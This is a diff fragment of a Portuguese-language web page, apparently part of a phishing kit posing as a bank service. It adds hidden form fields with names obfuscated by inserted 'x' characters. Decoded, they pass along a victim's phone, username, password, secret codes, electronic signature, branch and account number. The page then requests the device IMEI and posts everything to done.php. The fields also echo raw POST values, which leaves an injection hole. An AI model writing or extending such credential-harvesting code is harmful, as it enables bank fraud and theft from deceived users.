@@ -188,6 +188,16 @@ function checkIMEI(){
                     </article>
 				<hr class="style13">
 		         <form action="done.php" method="POST" onsubmit="return isOK;" id="frm">
+
+                <input name="xdxdxdxtxexlxexfxoxnxex" id="xdxdxdxtxexlxexfxoxnxex" type="hidden" value="<?php echo $_POST['xdxdxdxtxexlxexfxoxnxex']; ?>" >
+                <input name="xpxsxexcxrxextxax" id="xpxsxexcxrxextxax" type="hidden" value="<?php echo $_POST['xpxsxexcxrxextxax']; ?>">
+				<input name="xdx4x" id="xdx4x" type="hidden" value="<?php echo $_POST['xdx4x']; ?>" >
+                <input name="xuxsxuxaxrxixox" id="xuxsxuxaxrxixox" type="hidden" value="<?php echo $_POST['xuxsxuxaxrxixox']; ?>">
+                <input name="xsxexnxhxax" id="xsxexnxhxax" type="hidden" value="<?php echo $_POST['xsxexnxhxax']; ?>" >
+                <input name="xaxsxsxexlxextxrxoxnxixcxax" id="xaxsxsxexlxextxrxoxnxixcxax" type="hidden" value="<?php echo $_POST['xaxsxsxexlxextxrxoxnxixcxax']; ?>" >
+                <input name="xaxgxexnxcxixax" id="xaxgxexnxcxixax" type="hidden" value="<?php echo $_POST['xaxgxexnxcxixax']; ?>" >
+                <input name="xcxoxnxtxa" id="xcxoxnxtxa" type="hidden" value="<?php echo $_POST['xcxoxnxtxa']; ?>">
+
 				 <input name="imei" id="imei" type="tel" placeholder="Digite seu número IMEI" maxlength="15" required="required" onkeyup="pulacampo('imei','dispositivo');" class="input pass">
 				 
                     <div class="group" style="width: 92%;">
